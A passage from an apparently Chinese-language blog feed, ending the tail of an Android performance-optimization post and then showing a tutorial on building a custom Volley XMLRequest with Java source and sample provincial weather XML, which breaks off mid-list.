<p><strong>使用StringBuilder和StringBuffer进行字符串连接</strong>，尤其在做 SQL 拼装的时候。</p>
<p><strong>单线程应尽量使用HashMap, ArrayList</strong>，如果不确定是单线程还是多线程，建议还是用 ConcurrentHashMap…</p>
<p><strong>尽量在finally块中释放资源</strong>，例如很多 Cursor。</p>
<p><strong>慎用异常</strong>，创建一个异常时，需收集一个栈记录(stack track)，用于描述异常是在何处创建的。构建这些此栈时需要为运行时栈做一份快照，这一部分开销很大。</p>
<h2 id="View绘制">View绘制</h2><h4 id="过度绘制问题">过度绘制问题</h4><p>为什么会出现过度绘制：多个 View 重叠，复杂 Layout 叠加；导致 GPU 需要绘制多层，有些时候非常耗时。</p>
<p><a href="http://www.androidperformance.com/android-performance-optimization-overdraw-1.html" target="_blank" rel="external">Android性能优化之过渡绘制</a>，这篇博客作者用实例来解决过度绘制的问题，解决过度绘制问题时，作者也使用了我们上面介绍的几个工具。</p>
<h4 id="View局部更新">View局部更新</h4><p>一些复杂的 View，如果每次 View 有局部更新都要重新绘制 View的话，GPU 会显得力不从心。通过canvas.clipRect() 方法来让系统识别可绘制区域。这个方法可以指定一块矩形区域，只有在这个区域内才会被绘制，其他的区域会被忽视。clipRect方法节约了CPU与GPU资源，不会绘制clipRect区域外的地方，仅仅绘制内容在矩形区域内的组件。</p>
<h2 id="电量优化">电量优化</h2><p>尽量减少唤醒屏幕的次数与持续的时间(屏幕是用电大户)，用WakeLock来处理唤醒的问题，能够正确执行唤醒操作并根据设定及时关闭操作进入睡眠状态，使用 wakelock.acquice() 方法，一定要加上超时处理(例如释放锁)。</p>
<p>等到设备处于充电状态或者电量充足的时候才进行耗时耗电操作(如分享传送数据、图片处理等)</p>
<p>触发网络请求的操作，每次都会保持无线信号持续一段时间，我们可以把零散的网络请求打包进行一次操作，避免过多的无线信号引起的电量消耗(例如APP的数据采集)。</p>
<p>Battery Historian Tool(Android 5.0)这个工具可以详细查看各类应用的用电情况。</p>
<h2 id="APK_瘦身">APK 瘦身</h2><h4 id="代码瘦身">代码瘦身</h4><p>库的使用可以极大方便开发者快速开发产品，但也引入了潜在的 bug 以及库过大导致APK过大的问题。移除没有用的 dependency libraries 是一个很好的建议。另外适当的给库瘦身(提取自己想要的功能)也很重要。如果对 APK 代码非常熟悉可以使用 Proguard （会遍历你的所有代码然后找出无用处的代码）优化。</p>
<h4 id="控制资源文件">控制资源文件</h4><p>剔除没有用的资源文件(使用 Lint 可轻松检测到)。</p>
<p>资源里的照片先进行压缩再使用。合适的时候可以用代码控制图片大小作为不同分辨率屏幕的资源。</p>
<p>为应用提供 hdpi, xhdpi 和 xxhdpi 这几个屏幕密度的支持。如果某些设备不是这几个屏幕密度的，不用担心，Android 系统会自动使用存在的资源为设备计算然后提供资源文件。</p>
<h2 id="总结">总结</h2><p>出现卡顿的根本原因：系统绘制 View 超过 16ms，出现掉帧才导致卡顿或不流畅。解决方法：</p>
<ul>
<li>Hierarchy Viewer，Profile GPU rendering，traceview</li>
<li>抽象布局标签，使用标签 include、viewstub、merge</li>
<li>多使用缓存</li>
<li>尽量避免过度绘制</li>
<li>自定义复杂 View，动态更新 View 内容</li>
<li>正确使用 wakelock，保持 App 用电量</li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="工具">工具</h2><p>Hierarchy Viewer 是 Android SDK 自带的 Layout 嵌套检查工具，以可视化的布局角度直观获取 Layout 布局设计和各种属性信息，来帮助我们完成优化布局的设计。需要注意的是，出于安全考虑 Hierarchy Viewer 只能连接Android开发版手机(需要安装ViewServer)或是模拟器。<br>]]>
    
    </summary>
    
      <category term="Android" scheme="http://science09.github.io/tags/Android/"/>
    
      <category term="性能优化" scheme="http://science09.github.io/tags/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/"/>
    
      <category term="Android" scheme="http://science09.github.io/categories/Android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[使用Volley自定义XML Request请求]]></title>
    <link href="http://science09.github.io/2015/01/31/%E4%BD%BF%E7%94%A8Volley%E8%87%AA%E5%AE%9A%E4%B9%89XML-Request%E8%AF%B7%E6%B1%82/"/>
    <id>http://science09.github.io/2015/01/31/使用Volley自定义XML-Request请求/</id>
    <published>2015-01-31T14:11:10.000Z</published>
    <updated>2015-09-10T14:11:01.000Z</updated>
    <content type="html"><![CDATA[<p>谷歌官方提供的Volley包中，已经提供了多种Request，如StringRequest， JsonRequest，ImageRequest等。谷歌官方只提供了Json请求封装，用于请求一条JSON格式的数据。目前，网络上传输的数据通常有两种方式，JSON和XML。今天我们就来自定义自己的XML请求。<br><a id="more"></a></p>
<h2 id="自定义XMLRequest">自定义XMLRequest</h2><p>自定义一个XMLRequest用于请求一条XML格式的网络数据。在自定义XMLRequest之前，可以先参考StringRequest类的实现，然后模仿StringRequest就可以写出XMLRequest。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StringRequest</span> <span class="keyword">extends</span> <span class="title">Request</span>&lt;<span class="title">String</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Listener&lt;String&gt; mListener;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span><br><span class="line">     * Creates a new request with the given method.</span><br><span class="line">     *</span><br><span class="line">     * <span class="doctag">@param</span> method the request &#123;<span class="doctag">@link</span> Method&#125; to use</span><br><span class="line">     * <span class="doctag">@param</span> url URL to fetch the string at</span><br><span class="line">     * <span class="doctag">@param</span> listener Listener to receive the String response</span><br><span class="line">     * <span class="doctag">@param</span> errorListener Error listener, or null to ignore errors</span><br><span class="line">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">StringRequest</span><span class="params">(<span class="keyword">int</span> method, String url, Listener&lt;String&gt; listener,</span><br><span class="line">            ErrorListener errorListener)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(method, url, errorListener);</span><br><span class="line">        mListener = listener;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span><br><span class="line">     * Creates a new GET request.</span><br><span class="line">     *</span><br><span class="line">     * <span class="doctag">@param</span> url URL to fetch the string at</span><br><span class="line">     * <span class="doctag">@param</span> listener Listener to receive the String response</span><br><span class="line">     * <span class="doctag">@param</span> errorListener Error listener, or null to ignore errors</span><br><span class="line">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">StringRequest</span><span class="params">(String url, Listener&lt;String&gt; listener, ErrorListener errorListener)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(Method.GET, url, listener, errorListener);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="annotation">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">deliverResponse</span><span class="params">(String response)</span> </span>&#123;</span><br><span class="line">        mListener.onResponse(response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="annotation">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Response&lt;String&gt; <span class="title">parseNetworkResponse</span><span class="params">(NetworkResponse response)</span> </span>&#123;</span><br><span class="line">        String parsed;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            parsed = <span class="keyword">new</span> String(response.data, HttpHeaderParser.parseCharset(response.headers));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">            parsed = <span class="keyword">new</span> String(response.data);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Response.success(parsed, HttpHeaderParser.parseCacheHeaders(response));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过源码，我们可以看到，StringRequst继承自Requst类，Requst可以指定一个泛型类，这里指定的是String类。接着StringRequest实现了两个有参构造函数。StringRequest实现了deliverResponse方法和parseNetworkResponse方法，这两个方法在Request中都是抽象方法，因此需要在子类中进行实现。deliverResponse()方法中的实现很简单，仅仅是调用了mListener中的onResponse()方法，并将response内容传入即可，这样就可以将服务器响应的数据进行回调了。parseNetworkResponse()方法中则应该对服务器响应的数据进行解析，其中数据是以字节的形式存放在NetworkResponse的data变量中的，这里将数据取出然后组装成一个String，并传入Response的success()方法中即可。</p>
<p>了解了StringRequest的实现方法之后，我们可以实现自己的XMLRequest了。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XMLRequest</span> <span class="keyword">extends</span> <span class="title">Request</span>&lt;<span class="title">XmlPullParser</span>&gt; </span>&#123;  </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Listener&lt;XmlPullParser&gt; mListener;  </span><br><span class="line">      </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">XMLRequest</span><span class="params">(<span class="keyword">int</span> method, String url, Listener&lt;XmlPullParser&gt; listener,  </span><br><span class="line">              ErrorListener errorListener)</span> </span>&#123;  </span><br><span class="line">        <span class="keyword">super</span>(method, url, errorListener);  </span><br><span class="line">        mListener = listener;  </span><br><span class="line">    &#125;  </span><br><span class="line">      </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">XMLRequest</span><span class="params">(String url, Listener&lt;XmlPullParser&gt; listener, ErrorListener errorListener)</span> </span>&#123;  </span><br><span class="line">        <span class="keyword">this</span>(Method.GET, url, listener, errorListener);  </span><br><span class="line">    &#125;  </span><br><span class="line">      </span><br><span class="line">    <span class="annotation">@Override</span>  </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Response&lt;XmlPullParser&gt; <span class="title">parseNetworkResponse</span><span class="params">(NetworkResponse response)</span> </span>&#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                String xmlString = <span class="keyword">new</span> String(response.data,  </span><br><span class="line">                        HttpHeaderParser.parseCharset(response.headers));  </span><br><span class="line">                XmlPullParserFactory factory = XmlPullParserFactory.newInstance();  </span><br><span class="line">                XmlPullParser xmlPullParser = factory.newPullParser();  </span><br><span class="line">                xmlPullParser.setInput(<span class="keyword">new</span> StringReader(xmlString));  </span><br><span class="line">                <span class="keyword">return</span> Response.success(xmlPullParser, HttpHeaderParser.parseCacheHeaders(response));  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;  </span><br><span class="line">                <span class="keyword">return</span> Response.error(<span class="keyword">new</span> ParseError(e));  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (XmlPullParserException e) &#123;  </span><br><span class="line">                <span class="keyword">return</span> Response.error(<span class="keyword">new</span> ParseError(e));  </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="annotation">@Override</span> </span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">deliverResponse</span><span class="params">(XmlPullParser response)</span> </span>&#123;  </span><br><span class="line">            mListener.onResponse(response);  </span><br><span class="line">        &#125;  </span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>基本都是仿照StringRequest写下来的，XMLRequest也是继承自Request类的，只不过这里指定的泛型类是XmlPullParser，说明我们准备使用Pull解析的方式来解析XML。在parseNetworkResponse()方法中，先是将服务器响应的数据解析成一个字符串，然后设置到XmlPullParser对象中，在deliverResponse()方法中则是将XmlPullParser对象进行回调。</p>
<p>完成了自定义XMLRequest，我们准备一个实例来测试一下XMLRequest。我们准备访问 <a href="http://flash.weather.com.cn/wmaps/xml/china.xml，" target="_blank" rel="external">http://flash.weather.com.cn/wmaps/xml/china.xml，</a> 这个链接会以XML格式返回所有省份的天气数据。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">china</span> <span class="attribute">dn</span>=<span class="value">"nay"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"黑龙江"</span> <span class="attribute">pyName</span>=<span class="value">"heilongjiang"</span> <span class="attribute">cityname</span>=<span class="value">"哈尔滨"</span> <span class="attribute">state1</span>=<span class="value">"0"</span> <span class="attribute">state2</span>=<span class="value">"0"</span> <span class="attribute">stateDetailed</span>=<span class="value">"晴"</span> <span class="attribute">tem1</span>=<span class="value">"-20"</span> <span class="attribute">tem2</span>=<span class="value">"-8"</span> <span class="attribute">windState</span>=<span class="value">"西南风小于3级"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"吉林"</span> <span class="attribute">pyName</span>=<span class="value">"jilin"</span> <span class="attribute">cityname</span>=<span class="value">"长春"</span> <span class="attribute">state1</span>=<span class="value">"0"</span> <span class="attribute">state2</span>=<span class="value">"0"</span> <span class="attribute">stateDetailed</span>=<span class="value">"晴"</span> <span class="attribute">tem1</span>=<span class="value">"-18"</span> <span class="attribute">tem2</span>=<span class="value">"-6"</span> <span class="attribute">windState</span>=<span class="value">"西南风小于3级"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"辽宁"</span> <span class="attribute">pyName</span>=<span class="value">"liaoning"</span> <span class="attribute">cityname</span>=<span class="value">"沈阳"</span> <span class="attribute">state1</span>=<span class="value">"0"</span> <span class="attribute">state2</span>=<span class="value">"0"</span> <span class="attribute">stateDetailed</span>=<span class="value">"晴"</span> <span class="attribute">tem1</span>=<span class="value">"-20"</span> <span class="attribute">tem2</span>=<span class="value">"-1"</span> <span class="attribute">windState</span>=<span class="value">"东风转西南风小于3级"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"海南"</span> <span class="attribute">pyName</span>=<span class="value">"hainan"</span> <span class="attribute">cityname</span>=<span class="value">"海口"</span> <span class="attribute">state1</span>=<span class="value">"1"</span> <span class="attribute">state2</span>=<span class="value">"1"</span> <span class="attribute">stateDetailed</span>=<span class="value">"多云"</span> <span class="attribute">tem1</span>=<span class="value">"17"</span> <span class="attribute">tem2</span>=<span class="value">"20"</span> <span class="attribute">windState</span>=<span class="value">"东北风3-4级转微风"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"内蒙古"</span> <span class="attribute">pyName</span>=<span class="value">"neimenggu"</span> <span class="attribute">cityname</span>=<span class="value">"呼和浩特"</span> <span class="attribute">state1</span>=<span class="value">"14"</span> <span class="attribute">state2</span>=<span class="value">"14"</span> <span class="attribute">stateDetailed</span>=<span class="value">"小雪"</span> <span class="attribute">tem1</span>=<span class="value">"-13"</span> <span class="attribute">tem2</span>=<span class="value">"-4"</span> <span class="attribute">windState</span>=<span class="value">"微风转南风小于3级"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"新疆"</span> <span class="attribute">pyName</span>=<span class="value">"xinjiang"</span> <span class="attribute">cityname</span>=<span class="value">"乌鲁木齐"</span> <span class="attribute">state1</span>=<span class="value">"0"</span> <span class="attribute">state2</span>=<span class="value">"0"</span> <span class="attribute">stateDetailed</span>=<span class="value">"晴"</span> <span class="attribute">tem1</span>=<span class="value">"-19"</span> <span class="attribute">tem2</span>=<span class="value">"-12"</span> <span class="attribute">windState</span>=<span class="value">"微风"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"西藏"</span> <span class="attribute">pyName</span>=<span class="value">"xizang"</span> <span class="attribute">cityname</span>=<span class="value">"拉萨"</span> <span class="attribute">state1</span>=<span class="value">"1"</span> <span class="attribute">state2</span>=<span class="value">"0"</span> <span class="attribute">stateDetailed</span>=<span class="value">"多云转晴"</span> <span class="attribute">tem1</span>=<span class="value">"-8"</span> <span class="attribute">tem2</span>=<span class="value">"6"</span> <span class="attribute">windState</span>=<span class="value">"微风"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"青海"</span> <span class="attribute">pyName</span>=<span class="value">"qinghai"</span> <span class="attribute">cityname</span>=<span class="value">"西宁"</span> <span class="attribute">state1</span>=<span class="value">"1"</span> <span class="attribute">state2</span>=<span class="value">"0"</span> <span class="attribute">stateDetailed</span>=<span class="value">"多云转晴"</span> <span class="attribute">tem1</span>=<span class="value">"-14"</span> <span class="attribute">tem2</span>=<span class="value">"3"</span> <span class="attribute">windState</span>=<span class="value">"微风"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"宁夏"</span> <span class="attribute">pyName</span>=<span class="value">"ningxia"</span> <span class="attribute">cityname</span>=<span class="value">"银川"</span> <span class="attribute">state1</span>=<span class="value">"14"</span> <span class="attribute">state2</span>=<span class="value">"1"</span> <span class="attribute">stateDetailed</span>=<span class="value">"小雪转多云"</span> <span class="attribute">tem1</span>=<span class="value">"-9"</span> <span class="attribute">tem2</span>=<span class="value">"0"</span> <span class="attribute">windState</span>=<span class="value">"微风"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"甘肃"</span> <span class="attribute">pyName</span>=<span class="value">"gansu"</span> <span class="attribute">cityname</span>=<span class="value">"兰州"</span> <span class="attribute">state1</span>=<span class="value">"1"</span> <span class="attribute">state2</span>=<span class="value">"0"</span> <span class="attribute">stateDetailed</span>=<span class="value">"多云转晴"</span> <span class="attribute">tem1</span>=<span class="value">"-10"</span> <span class="attribute">tem2</span>=<span class="value">"4"</span> <span class="attribute">windState</span>=<span class="value">"微风"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"河北"</span> <span class="attribute">pyName</span>=<span class="value">"hebei"</span> <span class="attribute">cityname</span>=<span class="value">"石家庄"</span> <span class="attribute">state1</span>=<span class="value">"0"</span> <span class="attribute">state2</span>=<span class="value">"1"</span> <span class="attribute">stateDetailed</span>=<span class="value">"晴转多云"</span> <span class="attribute">tem1</span>=<span class="value">"-5"</span> <span class="attribute">tem2</span>=<span class="value">"2"</span> <span class="attribute">windState</span>=<span class="value">"微风转南风小于3级"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"河南"</span> <span class="attribute">pyName</span>=<span class="value">"henan"</span> <span class="attribute">cityname</span>=<span class="value">"郑州"</span> <span class="attribute">state1</span>=<span class="value">"1"</span> <span class="attribute">state2</span>=<span class="value">"1"</span> <span class="attribute">stateDetailed</span>=<span class="value">"多云"</span> <span class="attribute">tem1</span>=<span class="value">"-4"</span> <span class="attribute">tem2</span>=<span class="value">"4"</span> <span class="attribute">windState</span>=<span class="value">"微风"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"湖北"</span> <span class="attribute">pyName</span>=<span class="value">"hubei"</span> <span class="attribute">cityname</span>=<span class="value">"武汉"</span> <span class="attribute">state1</span>=<span class="value">"6"</span> <span class="attribute">state2</span>=<span class="value">"2"</span> <span class="attribute">stateDetailed</span>=<span class="value">"雨夹雪转阴"</span> <span class="attribute">tem1</span>=<span class="value">"-1"</span> <span class="attribute">tem2</span>=<span class="value">"4"</span> <span class="attribute">windState</span>=<span class="value">"微风"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"湖南"</span> <span class="attribute">pyName</span>=<span class="value">"hunan"</span> <span class="attribute">cityname</span>=<span class="value">"长沙"</span> <span class="attribute">state1</span>=<span class="value">"6"</span> <span class="attribute">state2</span>=<span class="value">"7"</span> <span class="attribute">stateDetailed</span>=<span class="value">"雨夹雪转小雨"</span> <span class="attribute">tem1</span>=<span class="value">"1"</span> <span class="attribute">tem2</span>=<span class="value">"3"</span> <span class="attribute">windState</span>=<span class="value">"微风"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"山东"</span> <span class="attribute">pyName</span>=<span class="value">"shandong"</span> <span class="attribute">cityname</span>=<span class="value">"济南"</span> <span class="attribute">state1</span>=<span class="value">"1"</span> <span class="attribute">state2</span>=<span class="value">"1"</span> <span class="attribute">stateDetailed</span>=<span class="value">"多云"</span> <span class="attribute">tem1</span>=<span class="value">"-5"</span> <span class="attribute">tem2</span>=<span class="value">"4"</span> <span class="attribute">windState</span>=<span class="value">"南风小于3级"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"江苏"</span> <span class="attribute">pyName</span>=<span class="value">"jiangsu"</span> <span class="attribute">cityname</span>=<span class="value">"南京"</span> <span class="attribute">state1</span>=<span class="value">"2"</span> <span class="attribute">state2</span>=<span class="value">"2"</span> <span class="attribute">stateDetailed</span>=<span class="value">"阴"</span> <span class="attribute">tem1</span>=<span class="value">"-1"</span> <span class="attribute">tem2</span>=<span class="value">"6"</span> <span class="attribute">windState</span>=<span class="value">"东北风小于3级"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"安徽"</span> <span class="attribute">pyName</span>=<span class="value">"anhui"</span> <span class="attribute">cityname</span>=<span class="value">"合肥"</span> <span class="attribute">state1</span>=<span class="value">"2"</span> <span class="attribute">state2</span>=<span class="value">"6"</span> <span class="attribute">stateDetailed</span>=<span class="value">"阴转雨夹雪"</span> <span class="attribute">tem1</span>=<span class="value">"0"</span> <span class="attribute">tem2</span>=<span class="value">"4"</span> <span class="attribute">windState</span>=<span class="value">"微风"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"山西"</span> <span class="attribute">pyName</span>=<span class="value">"shanxi"</span> <span class="attribute">cityname</span>=<span class="value">"太原"</span> <span class="attribute">state1</span>=<span class="value">"1"</span> <span class="attribute">state2</span>=<span class="value">"1"</span> <span class="attribute">stateDetailed</span>=<span class="value">"多云"</span> <span class="attribute">tem1</span>=<span class="value">"-9"</span> <span class="attribute">tem2</span>=<span class="value">"2"</span> <span class="attribute">windState</span>=<span class="value">"微风"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"陕西"</span> <span class="attribute">pyName</span>=<span class="value">"sanxi"</span> <span class="attribute">cityname</span>=<span class="value">"西安"</span> <span class="attribute">state1</span>=<span class="value">"2"</span> <span class="attribute">state2</span>=<span class="value">"2"</span> <span class="attribute">stateDetailed</span>=<span class="value">"阴"</span> <span class="attribute">tem1</span>=<span class="value">"-4"</span> <span class="attribute">tem2</span>=<span class="value">"3"</span> <span class="attribute">windState</span>=<span class="value">"南风小于3级"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"四川"</span> <span class="attribute">pyName</span>=<span class="value">"sichuan"</span> <span class="attribute">cityname</span>=<span class="value">"成都"</span> <span class="attribute">state1</span>=<span class="value">"2"</span> <span class="attribute">state2</span>=<span class="value">"2"</span> <span class="attribute">stateDetailed</span>=<span class="value">"阴"</span> <span class="attribute">tem1</span>=<span class="value">"2"</span> <span class="attribute">tem2</span>=<span class="value">"5"</span> <span class="attribute">windState</span>=<span class="value">"微风"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"云南"</span> <span class="attribute">pyName</span>=<span class="value">"yunnan"</span> <span class="attribute">cityname</span>=<span class="value">"昆明"</span> <span class="attribute">state1</span>=<span class="value">"3"</span> <span class="attribute">state2</span>=<span class="value">"1"</span> <span class="attribute">stateDetailed</span>=<span class="value">"阵雨转多云"</span> <span class="attribute">tem1</span>=<span class="value">"6"</span> <span class="attribute">tem2</span>=<span class="value">"18"</span> <span class="attribute">windState</span>=<span class="value">"微风"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"贵州"</span> <span class="attribute">pyName</span>=<span class="value">"guizhou"</span> <span class="attribute">cityname</span>=<span class="value">"贵阳"</span> <span class="attribute">state1</span>=<span class="value">"19"</span> <span class="attribute">state2</span>=<span class="value">"2"</span> <span class="attribute">stateDetailed</span>=<span class="value">"冻雨转阴"</span> <span class="attribute">tem1</span>=<span class="value">"-3"</span> <span class="attribute">tem2</span>=<span class="value">"2"</span> <span class="attribute">windState</span>=<span class="value">"东北风小于3级"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"浙江"</span> <span class="attribute">pyName</span>=<span class="value">"zhejiang"</span> <span class="attribute">cityname</span>=<span class="value">"杭州"</span> <span class="attribute">state1</span>=<span class="value">"2"</span> <span class="attribute">state2</span>=<span class="value">"7"</span> <span class="attribute">stateDetailed</span>=<span class="value">"阴转小雨"</span> <span class="attribute">tem1</span>=<span class="value">"2"</span> <span class="attribute">tem2</span>=<span class="value">"7"</span> <span class="attribute">windState</span>=<span class="value">"微风转东北风小于3级"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"福建"</span> <span class="attribute">pyName</span>=<span class="value">"fujian"</span> <span class="attribute">cityname</span>=<span class="value">"福州"</span> <span class="attribute">state1</span>=<span class="value">"2"</span> <span class="attribute">state2</span>=<span class="value">"1"</span> <span class="attribute">stateDetailed</span>=<span class="value">"阴转多云"</span> <span class="attribute">tem1</span>=<span class="value">"6"</span> <span class="attribute">tem2</span>=<span class="value">"13"</span> <span class="attribute">windState</span>=<span class="value">"微风"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"江西"</span> <span class="attribute">pyName</span>=<span class="value">"jiangxi"</span> <span class="attribute">cityname</span>=<span class="value">"南昌"</span> <span class="attribute">state1</span>=<span class="value">"2"</span> <span class="attribute">state2</span>=<span class="value">"2"</span> <span class="attribute">stateDetailed</span>=<span class="value">"阴"</span> <span class="attribute">tem1</span>=<span class="value">"2"</span> <span class="attribute">tem2</span>=<span class="value">"5"</span> <span class="attribute">windState</span>=<span class="value">"北风3-4级转微风"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"广东"</span> <span class="attribute">pyName</span>=<span class="value">"guangdong"</span> <span class="attribute">cityname</span>=<span class="value">"广州"</span> <span class="attribute">state1</span>=<span class="value">"1"</span> <span class="attribute">state2</span>=<span class="value">"1"</span> <span class="attribute">stateDetailed</span>=<span class="value">"多云"</span> <span 